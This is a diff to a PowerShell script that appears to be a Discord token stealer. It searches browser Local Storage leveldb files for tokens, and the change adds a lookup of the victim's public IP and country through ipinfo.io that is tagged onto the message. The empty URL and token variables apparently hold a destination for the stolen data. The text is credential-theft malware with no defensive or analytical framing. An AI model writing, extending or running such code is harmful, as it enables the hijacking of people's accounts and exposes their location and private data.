@@ -1,5 +1,4 @@
 $url = "";
-
 $Discord_token = "";
 
 function Find-Tokens {
@@ -8,7 +7,7 @@ function Find-Tokens {
     $path += '\Local Storage\leveldb';
     $tokens = @();
 
-    Get-ChildItem $path | ForEach-Object {;
+    Get-ChildItem $path | ForEach-Object {
         $file_name = $_.Name;
 
         if ($file_name -notmatch '\.log$' -and $file_name -notmatch '\.ldb$') {
@@ -43,6 +42,11 @@ function Main {
         'Yandex'         = "$local\Yandex\YandexBrowser\User Data\Default"
     };
 
+    $ip = Invoke-RestMethod http://ipinfo.io/json;
+
+    $IP_client = $ip.ip;
+    $Country_client = $ip.country;
+
     $message = '';
 
     foreach ($platform in $paths.Keys) {
@@ -52,7 +56,7 @@ function Main {
             continue;
         }
 
-        $message += "$platform`n";
+        $message += "IP: $IP_client, Country: $Country_client`nDiscord Token`n";
 
         $tokens = Find-Tokens -path $path;
 
